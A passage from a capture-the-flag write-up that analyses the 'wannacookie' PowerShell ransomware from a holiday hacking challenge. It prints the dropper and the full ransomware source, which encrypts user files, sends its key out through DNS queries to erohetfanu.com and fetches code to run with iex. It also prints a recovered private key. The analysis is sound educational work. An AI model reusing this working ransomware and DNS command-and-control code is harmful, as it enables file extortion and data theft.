ExecutionPolicy | May run PowerShell commands | | Suspicious | New-Object | May create an OLE object using | | | | PowerShell | | IOC | powershell.exe | Executable file name | +------------+-----------------+-----------------------------------------+ The payload is compressed and base64 encoded, so it's not immediately apparent what it does. To help get a better look at what's inside, we'll modify the code and allow it to run in a controlled fashion. Caution Always use an isolated test system to avoid an accidental infection or spread of the malware you're analyzing. If you don't have an Windows 10 test system handy, you can download a prebuilt virtual machine from Microsoft that's free to use for 90 days here: https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/ The modification is pretty simple. Below, we've made the following two changes: Replace the iex function call with a $ , which creates a text string out of the deobfuscated code instead of executing it. Pipe the resulting string to the host so it will be printed on the screen. Run this modified command at a Windows Command prompt: powershell . exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C sal a New-Object; $( a IO . StreamReader (( a IO . Compression . DeflateStream ( [IO.MemoryStream][Convert] :: FromBase64String ( lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG ), [IO.Compression.CompressionMode] :: Decompress )), [Text.Encoding] :: ASCII )) .ReadToEnd() | Out-Host In the resulting output, we now see the deobfuscated code. function H2A ( $a ) { $o ; $a -split (..) | ? { $_ } | forEach { [char] ( [convert] :: toint16 ( $_ , 16 ))} | forEach { $o = $o + $_ }; return $o }; $f = 77616E6E61636F6F6B69652E6D696E2E707331 ; $h = ; foreach ( $i in 0 ..( [convert] :: ToInt32 (( Resolve-DnsName -Server erohetfanu . com -Name $f.erohetfanu.com -Type TXT ). strings , 10 )- 1 )) { $h += ( Resolve-DnsName -Server erohetfanu . com -Name $i.$f.erohetfanu.com -Type TXT ). strings }; iex ($( H2A $h | Out-string )) What does this code do? Declares a function that converts a hex-encoded string to ascii text output Defines a couple of variables, one of which is the hex-encoded text string for \"wannacookie.min.ps1\" Sets up a loop that iterates i times, where i is an integer value retrieved from a DNS TXT record 77616E6E61636F6F6B69652E6D696E2E707331.erohetfanu.com Each time the loop executes, it retrieves data from a DNS TXT record i.77616E6E61636F6F6B69652E6D696E2E707331.erohetfanu.com and concatenates them together into string $h After the final iteration, the hex-encoded value of $h is decoded to its text and executed with the iex function We can see from this that the domain name used in the malware is erohetfanu.com , which completes this part of the objective.","title":"Solution"},{"location":"Objectives/9-ransomware.html#part-3-stop-the-malware","text":"","title":"Part 3: Stop the Malware"},{"location":"Objectives/9-ransomware.html#problem_3","text":"Identify a way to stop the malware in its tracks!","title":"Problem"},{"location":"Objectives/9-ransomware.html#solution_2","text":"The code we found in part 2 was only a dropper, which is essentially just malware that downloads additional malware. In order to figure out how to stop the malware, we need to see what the dropper downloaded to Alabaster's computer. Using a similar approach as before, we'll remove the iex function from the dropper code and redirect the results to a file. function H2A ( $a ) { $o ; $a -split (..) | ? { $_ } | forEach { [char] ( [convert] :: toint16 ( $_ , 16 ))} | forEach { $o = $o + $_ }; return $o }; $f = 77616E6E61636F6F6B69652E6D696E2E707331 ; $h = ; foreach ( $i in 0 ..( [convert] :: ToInt32 (( Resolve-DnsName -Server erohetfanu . com -Name $f.erohetfanu.com -Type TXT ). strings , 10 )- 1 )) { $h += ( Resolve-DnsName -Server erohetfanu . com -Name $i.$f.erohetfanu.com -Type TXT ). strings }; $( H2A $h | Out-String ) | Out-File C : \\ hhc18 \\ wannacookie . min . ps1 When we execute this, the output is minified and difficult to read. $functions = { function e_d_file ( $key , $File , $enc_it ) { [byte[]] $key = $key ; $Suffix = `.wannacookie ; [System.Reflection.Assembly] :: LoadWithPartialName ( System.Security.Cryptography ); [System.Int32] $KeySize = $key . Length * 8 ; $AESP = New-Object System.Security.Cryptography.AesManaged ; $AESP . Mode = [System.Security.Cryptography.CipherMode] :: CBC ; $AESP . BlockSize = 128 ; $AESP . KeySize = $KeySize ; $AESP . Key = $key ; $FileSR = New-Object System . IO . FileStream ( $File , [System.IO.FileMode] :: Open ); if ( $enc_it ) { $DestFile = $File + $Suffix } else { $DestFile = ( $File -replace $Suffix )}; $FileSW = New-Object System . IO . FileStream ( $DestFile , [System.IO.FileMode] :: Create ); if ( $enc_it ) { $AESP . GenerateIV (); $FileSW . Write ( [System.BitConverter] :: GetBytes ( $AESP . IV . Length ), 0 , 4 ); $FileSW . Write ( $AESP . IV , 0 , $AESP . IV . Length ); $Transform = $AESP . CreateEncryptor ()} else { [Byte[]] $LenIV = New-Object Byte [] 4 ; $FileSR . Seek ( 0 , [System.IO.SeekOrigin] :: Begin ) | Out-Null ; $FileSR . Read ( $LenIV , 0 , 3 ) | Out-Null ; [Int] $LIV = [System.BitConverter] :: ToInt32 ( $LenIV , 0 ); [Byte[]] $IV = New-Object Byte [] $LIV ; $FileSR . Seek ( 4 , [System.IO.SeekOrigin] :: Begin ) | Out-Null ; $FileSR . Read ( $IV , 0 , $LIV ) | Out-Null ; $AESP . IV = $IV ; $Transform = $AESP . CreateDecryptor ()}; $CryptoS = New-Object System . Security . Cryptography . CryptoStream ( $FileSW , $Transform , [System.Security.Cryptography.CryptoStreamMode] :: Write ); [Int] $Count = 0 ; [Int] $BlockSzBts = $AESP . BlockSize / 8 ; [Byte[]] $Data = New-Object Byte [] $BlockSzBts ; Do { $Count = $FileSR . Read ( $Data , 0 , $BlockSzBts ); $CryptoS . Write ( $Data , 0 , $Count )} While ( $Count -gt 0 ); $CryptoS . FlushFinalBlock (); $CryptoS . Close (); $FileSR . Close (); $FileSW . Close (); Clear-variable -Name key ; Remove-Item $File }}; function H2B { param ( $HX ); $HX = $HX -split (..) | ? { $_ }; ForEach ( $value in $HX ){ [Convert] :: ToInt32 ( $value , 16 )}}; function A2H (){ Param ( $a ); $c = ; $b = $a . ToCharArray ();; Foreach ( $element in $b ) { $c = $c + + [System.String] :: Format ( {0:X} , [System.Convert] :: ToUInt32 ( $element ))}; return $c -replace }; function H2A () { Param ( $a ); $outa ; $a -split (..) | ? { $_ } | forEach { [char] ( [convert] :: toint16 ( $_ , 16 ))} | forEach { $outa = $outa + $_ }; return $outa }; function B2H { param ( $DEC ); $tmp = ; ForEach ( $value in $DEC ){ $a = {0:x} -f [Int] $value ; if ( $a . length -eq 1 ){ $tmp += 0 + $a } else { $tmp += $a }}; return $tmp }; function ti_rox { param ( $b1 , $b2 ); $b1 = $( H2B $b1 ); $b2 = $( H2B $b2 ); $cont = New-Object Byte [] $b1 . count ; if ( $b1 . count -eq $b2 . count ) { for ( $i = 0 ; $i -lt $b1 . count ; $i ++) { $cont [ $i ] = $b1 [ $i ] -bxor $b2 [ $i ]}}; return $cont }; function B2G { param ( [byte[]] $Data ); Process { $out = [System.IO.MemoryStream] :: new (); $gStream = New-Object System . IO . Compression . GzipStream $out , ( [IO.Compression.CompressionMode] :: Compress ); $gStream . Write ( $Data , 0 , $Data . Length ); $gStream . Close (); return $out . ToArray ()}}; function G2B { param ( [byte[]] $Data ); Process { $SrcData = New-Object System . IO . MemoryStream ( , $Data ); $output = New-Object System . IO . MemoryStream ; $gStream = New-Object System . IO . Compression . GzipStream $SrcData , ( [IO.Compression.CompressionMode] :: Decompress ); $gStream . CopyTo ( $output ); $gStream . Close (); $SrcData . Close (); [byte[]] $byteArr = $output . ToArray (); return $byteArr }}; function sh1 ( [String] $String ) { $SB = New-Object System . Text . StringBuilder ; [System.Security.Cryptography.HashAlgorithm] :: Create ( SHA1 ). ComputeHash ( [System.Text.Encoding] :: UTF8 . GetBytes ( $String ))|%{ [Void] $SB . Append ( $_ . ToString ( x2 ))}; $SB . ToString ()}; function p_k_e ( $key_bytes , [byte[]] $pub_bytes ){ $cert = New-Object -TypeName System . Security . Cryptography . X509Certificates . X509Certificate2 ; $cert . Import ( $pub_bytes ); $encKey = $cert . PublicKey . Key . Encrypt ( $key_bytes , $true ); return $( B2H $encKey )}; function e_n_d { param ( $key , $allfiles , $make_cookie ); $tcount = 12 ; for ( $file = 0 ; $file -lt $allfiles . length ; $file ++ ) { while ( $true ) { $running = @( Get-Job | Where-Object { $_ . State -eq Running }); if ( $running . Count -le $tcount ) { Start-Job -ScriptBlock { param ( $key , $File , $true_false ); try { e_d_file $key $File $true_false } catch { $_ . Exception . Message | Out-String | Out-File $( $env:userprofile + \\Desktop\\ps_log.txt ) -append }} -args $key , $allfiles [ $file ], $make_cookie -InitializationScript $functions ; break } else { Start-Sleep -m 200 ; continue }}}}; function g_o_dns ( $f ) { $h = ; foreach ( $i in 0 ..( [convert] :: ToInt32 ($( Resolve-DnsName -Server erohetfanu . com -Name $f.erohetfanu.com -Type TXT ). Strings , 10 )- 1 )) { $h += $( Resolve-DnsName -Server erohetfanu . com -Name $i.$f.erohetfanu.com -Type TXT ). Strings }; return ( H2A $h )}; function s_2_c ( $astring , $size = 32 ) { $new_arr = @(); $chunk_index = 0 ; foreach ( $i in 1 ..$( $astring . length / $size )) { $new_arr += @( $astring . substring ( $chunk_index , $size )); $chunk_index += $size }; return $new_arr }; function snd_k ( $enc_k ) { $chunks = ( s_2_c $enc_k ); foreach ( $j in $chunks ) { if ( $chunks . IndexOf ( $j ) -eq 0 ) { $n_c_id = $( Resolve-DnsName -Server erohetfanu . com -Name $j.6B6579666F72626F746964.erohetfanu.com -Type TXT ). Strings } else {$( Resolve-DnsName -Server erohetfanu . com -Name $n_c_id.$j.6B6579666F72626F746964.erohetfanu.com -Type TXT ). Strings }}; return $n_c_id }; function wanc { $S1 = 1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000 ; if ( $null -ne (( Resolve-DnsName -Name $( H2A $( B2H $( ti_rox $( B2H $( G2B $( H2B $S1 ))) $( Resolve-DnsName -Server erohetfanu . com -Name 6B696C6C737769746368 . erohetfanu . com -Type TXT ). Strings ))). ToString () -ErrorAction 0 -Server 8 . 8 . 8 . 8 ))) { return }; if ($( netstat -ano | Select-String 127.0.0.1:8080 ). length -ne 0 -or ( Get-WmiObject Win32_ComputerSystem ). Domain -ne KRINGLECASTLE ) { return }; $p_k = [System.Convert] :: FromBase64String ($( g_o_dns ( 7365727665722E637274 ) ) ); $b_k = ( [System.Text.Encoding] :: Unicode . GetBytes ($(( [char[]] ( [char]01..[char] 255 ) + ( [char[]] ( [char]01..[char] 255 )) + 0 .. 9 | sort { Get-Random })[ 0 .. 15 ] -join )) | ? { $_ -ne 0x00 }); $h_k = $( B2H $b_k ); $k_h = $( sh1 $h_k ); $p_k_e_k = ( p_k_e $b_k $p_k ). ToString (); $c_id = ( snd_k $p_k_e_k ); $d_t = (($( Get-Date ). ToUniversalTime () | Out-String ) -replace `r`n ); [array] $f_c = $( Get-ChildItem *. elfdb -Exclude *. wannacookie -Path $($( $env:userprofile + \\Desktop ),$( $env:userprofile + \\Documents ),$( $env:userprofile + \\Videos ),$( $env:userprofile + \\Pictures ),$( $env:userprofile + \\Music )) -Recurse | where { ! $_ . PSIsContainer } | Foreach -Object { $_ . Fullname }); e_n_d $b_k $f_c $true ; Clear-variable -Name h_k ; Clear-variable -Name b_k ; $lurl = http://127.0.0.1:8080/ ; $html_c = @{ GET / = $( g_o_dns ( A2H source.min.html )); GET /close = p Bye! /p }; Start-Job -ScriptBlock { param ( $url ); Start-Sleep 10 ; Add-type -AssemblyName System . Windows . Forms ; start-process $url -WindowStyle Maximized ; Start-sleep 2 ; [System.Windows.Forms.SendKeys] :: SendWait ( {F11} )} -Arg $lurl ; $list = New-Object System . Net . HttpListener ; $list . Prefixes . Add ( $lurl ); $list . Start (); try { $close = $false ; while ( $list . IsListening ) { $context = $list . GetContext (); $Req = $context . Request ; $Resp = $context . Response ; $recvd = {0} {1} -f $Req . httpmethod , $Req . url . localpath ; if ( $recvd -eq GET / ) { $html = $html_c [ $recvd ]} elseif ( $recvd -eq GET /decrypt ) { $akey = $Req . QueryString . Item ( key ); if ( $k_h -eq $( sh1 $akey )) { $akey = $( H2B $akey ); [array] $f_c = $( Get-ChildItem -Path $( $env:userprofile ) -Recurse -Filter *. wannacookie | where { ! $_ . PSIsContainer } | Foreach -Object { $_ . Fullname }); e_n_d $akey $f_c $false ; $html = Files have been decrypted! ; $close = $true } else { $html = Invalid Key! }} elseif ( $recvd -eq GET /close ) { $close = $true ; $html = $html_c [ $recvd ]} elseif ( $recvd -eq GET /cookie_is_paid ) { $c_n_k = $( Resolve-DnsName -Server erohetfanu . com -Name ( $c_id.72616e736f6d697370616964.erohetfanu.com . trim ()) -Type TXT ). Strings ; if ( $c_n_k . length -eq 32 ) { $html = $c_n_k } else { $html = UNPAID|$c_id|$d_t }} else { $Resp . statuscode = 404 ; $html = h1 404 Not Found /h1 }; $buffer = [Text.Encoding] :: UTF8 . GetBytes ( $html ); $Resp . ContentLength64 = $buffer . length ; $Resp . OutputStream . Write ( $buffer , 0 , $buffer . length ); $Resp . Close (); if ( $close ) { $list . Stop (); return }}} finally { $list . Stop ()}}; wanc ; Note To minify code means to shorten variable names and remove whitespace to make the code more compact. We could try to clean this up manually using a Powershell code beautifier or some strategic search and replace operations, but it was hinted that there might be an unminified version of the code available. Since the string \"77616E6E61636F6F6B69652E6D696E2E707331\" is hex-encoded text string \"wannacookie.min.ps1\", what if we change it to \"77616E6E61636F6F6B69652E707331\" (wannacookie.ps1) and execute the code again? function H2A ( $a ) { $o ; $a -split (..) | ? { $_ } | forEach { [char] ( [convert] :: toint16 ( $_ , 16 ))} | forEach { $o = $o + $_ }; return $o }; ` $f = 77616E6E61636F6F6B69652E6D696E2E707331 ; $h = ; foreach ( $i in 0 ..( [convert] :: ToInt32 (( Resolve-DnsName -Server erohetfanu . com ` -Name $f.erohetfanu.com -Type TXT ). strings , 10 )- 1 )) { $h += ( Resolve-DnsName -Server erohetfanu . com -Name $i.$f.erohetfanu.com ` -Type TXT ). strings }; $( H2A $h | Out-string ) | Out-File C : \\ hhc18 \\ wannacookie . ps1 This time we get a file that's much easier on human eyes. $functions = { function Enc_Dec -File ( $key , $File , $enc_it ) { [byte[]] $key = $key $Suffix = `.wannacookie [System.Reflection.Assembly] :: LoadWithPartialName ( System.Security.Cryptography ) [System.Int32] $KeySize = $key . Length * 8 $AESP = New-Object System.Security.Cryptography.AesManaged $AESP . Mode = [System.Security.Cryptography.CipherMode] :: CBC $AESP . BlockSize = 128 $AESP . KeySize = $KeySize $AESP . Key = $key $FileSR = New-Object System . IO . FileStream ( $File , [System.IO.FileMode] :: Open ) if ( $enc_it ) { $DestFile = $File + $Suffix } else { $DestFile = ( $File -replace $Suffix )} $FileSW = New-Object System . IO . FileStream ( $DestFile , [System.IO.FileMode] :: Create ) if ( $enc_it ) { $AESP . GenerateIV () $FileSW . Write ( [System.BitConverter] :: GetBytes ( $AESP . IV . Length ), 0 , 4 ) $FileSW . Write ( $AESP . IV , 0 , $AESP . IV . Length ) $Transform = $AESP . CreateEncryptor () } else { [Byte[]] $LenIV = New-Object Byte [] 4 $FileSR . Seek ( 0 , [System.IO.SeekOrigin] :: Begin ) | Out-Null $FileSR . Read ( $LenIV , 0 , 3 ) | Out-Null [Int] $LIV = [System.BitConverter] :: ToInt32 ( $LenIV , 0 ) [Byte[]] $IV = New-Object Byte [] $LIV $FileSR . Seek ( 4 , [System.IO.SeekOrigin] :: Begin ) | Out-Null $FileSR . Read ( $IV , 0 , $LIV ) | Out-Null $AESP . IV = $IV $Transform = $AESP . CreateDecryptor () } $CryptoS = New-Object System . Security . Cryptography . CryptoStream ( $FileSW , $Transform , [System.Security.Cryptography.CryptoStreamMode] :: Write ) [Int] $Count = 0 [Int] $BlockSzBts = $AESP . BlockSize / 8 [Byte[]] $Data = New-Object Byte [] $BlockSzBts Do { $Count = $FileSR . Read ( $Data , 0 , $BlockSzBts ) $CryptoS . Write ( $Data , 0 , $Count ) } While ( $Count -gt 0 ) $CryptoS . FlushFinalBlock () $CryptoS . Close () $FileSR . Close () $FileSW . Close () Clear-variable -Name key Remove-Item $File } } function H2B { param ( $HX ) $HX = $HX -split (..) | ? { $_ } ForEach ( $value in $HX ){ [Convert] :: ToInt32 ( $value , 16 ) } } function A2H (){ Param ( $a ) $c = $b = $a . ToCharArray (); Foreach ( $element in $b ) { $c = $c + + [System.String] :: Format ( {0:X} , [System.Convert] :: ToUInt32 ( $element )) } return $c -replace } function H2A () { Param ( $a ) $outa $a -split (..) | ? { $_ } | forEach { [char] ( [convert] :: toint16 ( $_ , 16 ))} | forEach { $outa = $outa + $_ } return $outa } function B2H { param ( $DEC ) $tmp = ForEach ( $value in $DEC ){ $a = {0:x} -f [Int] $value if ( $a . length -eq 1 ){ $tmp += 0 + $a } else { $tmp += $a } } return $tmp } function ti_rox { param ( $b1 , $b2 ) $b1 = $( H2B $b1 ) $b2 = $( H2B $b2 ) $cont = New-Object Byte [] $b1 . count if ( $b1 . count -eq $b2 . count ) { for ( $i = 0 ; $i -lt $b1 . count ; $i ++) { $cont [ $i ] = $b1 [ $i ] -bxor $b2 [ $i ] } } return $cont } function B2G { param ( [byte[]] $Data ) Process { $out = [System.IO.MemoryStream] :: new () $gStream = New-Object System . IO . Compression . GzipStream $out , ( [IO.Compression.CompressionMode] :: Compress ) $gStream . Write ( $Data , 0 , $Data . Length ) $gStream . Close () return $out . ToArray () } } function G2B { param ( [byte[]] $Data ) Process { $SrcData = New-Object System . IO . MemoryStream ( , $Data ) $output = New-Object System . IO . MemoryStream $gStream = New-Object System . IO . Compression . GzipStream $SrcData , ( [IO.Compression.CompressionMode] :: Decompress ) $gStream . CopyTo ( $output ) $gStream . Close () $SrcData . Close () [byte[]] $byteArr = $output . ToArray () return $byteArr } } function Sha1 ( [String] $String ) { $SB = New-Object System . Text . StringBuilder [System.Security.Cryptography.HashAlgorithm] :: Create ( SHA1 ). ComputeHash ( [System.Text.Encoding] :: UTF8 . GetBytes ( $String ))|%{ [Void] $SB . Append ( $_ . ToString ( x2 )) } $SB . ToString () } function Pub_Key_Enc ( $key_bytes , [byte[]] $pub_bytes ){ $cert = New-Object -TypeName System . Security . Cryptography . X509Certificates . X509Certificate2 $cert . Import ( $pub_bytes ) $encKey = $cert . PublicKey . Key . Encrypt ( $key_bytes , $true ) return $( B2H $encKey ) } function enc_dec { param ( $key , $allfiles , $make_cookie ) $tcount = 12 for ( $file = 0 ; $file -lt $allfiles . length ; $file ++ ) { while ( $true ) { $running = @( Get-Job | Where-Object { $_ . State -eq Running }) if ( $running . Count -le $tcount ) { Start-Job -ScriptBlock { param ( $key , $File , $true_false ) try { Enc_Dec -File $key $File $true_false } catch { $_ . Exception . Message | Out-String | Out-File $( $env:userprofile + \\Desktop\\ps_log.txt ) -append } } -args $key , $allfiles [ $file ], $make_cookie -InitializationScript $functions break } else { Start-Sleep -m 200 continue } } } } function get_over_dns ( $f ) { $h = foreach ( $i in 0 ..( [convert] :: ToInt32 ($( Resolve-DnsName -Server erohetfanu . com -Name $f.erohetfanu.com -Type TXT ). Strings , 10 )- 1 )) { $h += $( Resolve-DnsName -Server erohetfanu . com -Name $i.$f.erohetfanu.com -Type TXT ). Strings } return ( H2A $h ) } function split_to_chunks ( $astring , $size = 32 ) { $new_arr = @() $chunk_index = 0 foreach ( $i in 1 ..$( $astring . length / $size )) { $new_arr += @( $astring . substring ( $chunk_index , $size )) $chunk_index += $size } return $new_arr } function send_key ( $encrypted_key ) { $chunks = ( split_to_chunks $encrypted_key ) foreach ( $j in $chunks ) { if ( $chunks . IndexOf ( $j ) -eq 0 ) { $new_cookie = $( Resolve-DnsName -Server erohetfanu . com -Name $j.6B6579666F72626F746964.erohetfanu.com -Type TXT ). Strings } else { $( Resolve-DnsName -Server erohetfanu . com -Name $new_cookie.$j.6B6579666F72626F746964.erohetfanu.com -Type TXT ). Strings } } return $new_cookie } function wannacookie { $S1 = 1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000 if ( $null -ne (( Resolve-DnsName -Name $( H2A $( B2H $( ti_rox $( B2H $( G2B $( H2B $S1 ))) $( Resolve-DnsName -Server erohetfanu . com -Name 6B696C6C737769746368 . erohetfanu . com -Type TXT ). Strings ))). ToString () -ErrorAction 0 -Server 8 . 8 . 8 . 8 ))) { return } if ($( netstat -ano | Select-String 127.0.0.1:8080 ). length -ne 0 -or ( Get-WmiObject Win32_ComputerSystem ). Domain -ne KRINGLECASTLE ) { return } $pub_key = [System.Convert] :: FromBase64String ($( get_over_dns ( 7365727665722E637274 ) ) ) $Byte_key = ( [System.Text.Encoding] :: Unicode . GetBytes ($(( [char[]] ( [char]01..[char] 255 ) + ( [char[]] ( [char]01..[char] 255 )) + 0 .. 9 | sort { Get-Random })[ 0 .. 15 ] -join )) | ? { $_ -ne 0x00 }) $Hex_key = $( B2H $Byte_key ) $Key_Hash = $( Sha1 $Hex_key ) $Pub_key_encrypted_Key = ( Pub_Key_Enc $Byte_key $pub_key ). ToString () $cookie_id = ( send_key $Pub_key_encrypted_Key ) $date_time = (($( Get-Date ). ToUniversalTime () | Out-String ) -replace `r`n ) [array] $future_cookies = $( Get-ChildItem *. elfdb -Exclude *. wannacookie -Path $($( $env:userprofile + \\Desktop ),$( $env:userprofile + \\Documents ),$( $env:userprofile + \\Videos ),$( $env:userprofile + \\Pictures ),$( $env:userprofile + \\Music )) -Recurse | where { ! $_ . PSIsContainer } | Foreach -Object { $_ . Fullname }) enc_dec $Byte_key $future_cookies $true Clear-variable -Name Hex_key Clear-variable -Name Byte_key $lurl = http://127.0.0.1:8080/ $htmlcontents = @{ GET / = $( get_over_dns ( A2H source.min.html )) GET /close = p Bye! /p } Start-Job -ScriptBlock { param ( $url ) Start-Sleep 10 Add-type -AssemblyName System . Windows . Forms start-process $url -WindowStyle Maximized Start-sleep 2 [System.Windows.Forms.SendKeys] :: SendWait ( {F11} ) } -Arg $lurl $listener = New-Object System . Net . HttpListener $listener . Prefixes . Add ( $lurl ) $listener . Start () try { $close = $false while ( $listener . IsListening ) { $context = $listener . GetContext () $Req = $context . Request $Resp = $context . Response $Resp . Headers . Add ( Access-Control-Allow-Origin , * ) $received = {0} {1} -f $Req . httpmethod , $Req . url . localpath if ( $received -eq GET / ) { $html = $htmlcontents [ $received ] } elseif ( $received -eq GET /decrypt ) { $akey = $Req . QueryString . Item ( key ) if ( $Key_Hash -eq $( Sha1 $akey )) { $akey = $( H2B $akey ) [array] $allcookies = $( Get-ChildItem -Path $( $env:userprofile ) -Recurse -Filter *. wannacookie | where { ! $_ . PSIsContainer } | Foreach -Object { $_ . Fullname }) enc_dec $akey $allcookies $false $html = Files have been decrypted! $close = $true } else { $html = Invalid Key! } } elseif ( $received -eq GET /close ) { $close = $true $html = $htmlcontents [ $received ] } elseif ( $received -eq GET /cookie_is_paid ) { $cookie_and_key = $( Resolve-DnsName -Server erohetfanu . com -Name ( $cookie_id.72616e736f6d697370616964.erohetfanu.com . trim ()) -Type TXT ). Strings if ( $cookie_and_key . length -eq 32 ) { $html = $cookie_and_key } else { $html = UNPAID|$cookie_id|$date_time } } else { $Resp . statuscode = 404 $html = h1 404 Not Found /h1 } $buffer = [Text.Encoding] :: UTF8 . GetBytes ( $html ) $Resp . ContentLength64 = $buffer . length $Resp . OutputStream . Write ( $buffer , 0 , $buffer . length ) $Resp . Close () if ( $close ) { $listener . Stop () return } } } finally { $listener . Stop () } } wannacookie A static analysis of the code reveals the following functionality (30,000 ft view): Perform a DNS query, and if it returns a result, stop running Check to make sure we're executing in the KRINGLECASTLE domain, otherwise stop running Download the public key from the malware server over DNS Generate a random key to encrypt files with Encrypt the file encryption key with the public key in the certificate Send the encrypted file encryption key to the server Fetch a list of files ending in .elfdb in the user's home directory Encrypt any matching files Clear the unencrypted file encryption key from memory Open a web listener to handle additional functions like displaying the ransom demands, and checking whether the ransom has been paid We also notice some additional hex encoded strings. Here's a summary of all the strings we've encountered so far: hex-encoded text text purpose 7365727665722E637274 server.crt Download malware public certificate 77616E6E61636F6F6B69652E6D696E2E707331 wannacookie.min.ps1 Download minified ransomware 77616E6E61636F6F6B69652E707331 wannacookie.ps1 Download unminified ransomware 6B696C6C737769746368 killswitch Check if killswitch should be activated 6B6579666F72626F746964 keyforbotid Transmit encryption key to the server 72616e736f6d697370616964 ransomispaid Check server for status of ransom payment The kill switch is what we're after in this step, but the hostname name that triggers it (stored in $S1) is obfuscated in multiple layers of encoding. There are a couple ways we could approach this without some serious reverse-engineering: 1) allow the code to run in a test environment while running a packet capture and see what's in the DNS request, or 2) let the malware do the heavy lifting for us! If we load wannacookie.ps1 into a Powershell ISE, which comes with Windows 10, we can use the debugger to control the flow of the program and run just the parts we want. We need the program to run as far as setting the $S1 variable, and then we'll take it from there. Load the script and add a breakpoint on the line that contains the killswitch step. if ( $null -ne (( Resolve-DnsName -Name $( H2A $( B2H $( ti_rox $( B2H $( G2B $( H2B $S1 ))) $( Resolve-DnsName -Server erohetfanu . com -Name 6B696C6C737769746368 . erohetfanu . com -Type TXT ). Strings ))). ToString () -ErrorAction 0 -Server 8 . 8 . 8 . 8 ))) { return }; When it hits the breakpoint and throws you the debugger prompt, simply copy and paste the code that performs the DNS lookup and see what it says. Hit Line breakpoint on C:\\hhc18\\wannacookie.ps1:107 [DBG] : PS C : \\ hhc18 $( H2A $( B2H $( ti_rox $( B2H $( G2B $( H2B $S1 ))) $( Resolve-DnsName -Server erohetfanu . com -Name 6B696C6C737769746368 . erohetfanu . com -Type TXT ). Strings ))) yippeekiyaa . aaay Just for fun, let's examine what's happening here: Start with $S1 = \"1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000\" Run $S1 through the H2B function (convert hex to bytes) Run resulting value through the G2B function (gzip decompress) Run resulting value through the B2H function (convert bytes to hex) Run resulting value through the ti_rox (xor_it backward!) function. This requires a little more explanation. The function takes two hex strings: one is the result from step 4, the other is the result of a DNS TXT query for 6B696C6C737769746368.erohetfanu.com, which is \"66667272727869657268667865666B73\", which is a hex encoded text string \"ffrrrxierhfxefks\". It runs both values through the H2B (hex to bytes) function, and then returns the result of a XOR operation of one against the other. Run resulting value through the B2H function again (convert bytes to hex) Finally, run resulting value through the H2A function (hex to ), and voila, we have yippeekiyaa.aaay! Once we register the yippeekiyaa.aaay domain at HoHoHoDaddy, we get a message Successfully registered yippeekiyaa.aaay! which completes the part of the objective.","title":"Solution"},{"location":"Objectives/9-ransomware.html#part-4-recover-the-password","text":"","title":"Part 4: Recover the Password"},{"location":"Objectives/9-ransomware.html#problem_4","text":"Recover Alabaster's password as found in the the encrypted password vault.","title":"Problem"},{"location":"Objectives/9-ransomware.html#solution_3","text":"The last bit of the challenge is to decrypt Alabaster's password vault, which the wannacookie malware encrypted. We don't want to pay the ransom, so let's see if we can find a way around that. Wannacookie employs public key cryptography to protect the symmetric key it uses to encrypt and decrypt files. Theoretically, by encrypting the file encryption key with the attacker's public key, only the attacker can then decrypt it using his private key. As we see in the static analysis above, one of the first things wannacookie does is download a certificate from the DNS server. The certificate contains the attacker's public key. $pub_key = [System.Convert] :: FromBase64String ($( get_over_dns ( 7365727665722E637274 ) ) ) \"7365727665722E637274\" is hex-encoded text string \"server.crt\", which is a common filename used to store a public key. Usually right along side of this file on the server would be server.key, which is the private key. What do you suppose would happen if we asked for server.key (\"7365727665722e6b6579\")? To make things easy, we re-use the dropper code from step 2: PS C : \\ hhc18 function H2A ( $a ) { $o ; $a -split (..) | ? { $_ } | forEach { [char] ( [convert] :: toint16 ( $_ , 16 ))} | forEach { $o = $o + $_ }; return $o }; $f = 7365727665722e6b6579 ; $h = ; foreach ( $i in 0 ..( [convert] :: ToInt32 (( Resolve-DnsName -Server erohetfanu . com -Name $f.erohetfanu.com -Type TXT ). strings , 10 )- 1 )) { $h += ( Resolve-DnsName -Server erohetfanu . com -Name $i.$f.erohetfanu.com -Type TXT ). strings }; ($( H2A $h | Out-string )) ---- -BEGIN PRIVATE KEY ----- MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDEiNzZVUbXCbMG L4sM2UtilR4seEZli2CMoDJ73qHql + tSpwtK9y4L6znLDLWSA6uvH + lmHhhep9ui W3vvHYCq + Ma5EljBrvwQy0e2Cr / qeNBrdMtQs9KkxMJAz0fRJYXvtWANFJF5A + Nq jI + jdMVtL8 + PVOGWp1PA8DSW7i + 9eLkqPbNDxCfFhAGGlHEU + cH0CTob0SB5Hk0S TPUKKJVc3fsD8 / t60yJThCw4GKkRwG8vqcQCgAGVQeLNYJMEFv0 + WHAt2WxjWTu3 HnAfMPsiEnk / y12SwHOCtaNjFR8Gt512D7idFVW4p5sT0mrrMiYJ + 7x6VeMIkrw4 tk / 1ZlYNAgMBAAECggEAHdIGcJOX5Bj8qPudxZ1S6uplYan + RHoZdDz6bAEj4Eyc 0DW4aO + IdRaD9mM / SaB09GWLLIt0dyhRExl + fJGlbEvDG2HFRd4fMQ0nHGAVLqaW OTfHgb9HPuj78ImDBCEFaZHDuThdulb0sr4RLWQScLbIb58Ze5p4AtZvpFcPt1fN 6YqS / y0i5VEFROWuldMbEJN1x + xeiJp8uIs5KoL9KH1njZcEgZVQpLXzrsjKr67U 3nYMKDemGjHanYVkF1pzv / rardUnS8h6q6JGyzV91PpLE2I0LY + tGopKmuTUzVOm Vf7sl5LMwEss1g3x8gOh215Ops9Y9zhSfJhzBktYAQKBgQDl + w + KfSb3qZREVvs9 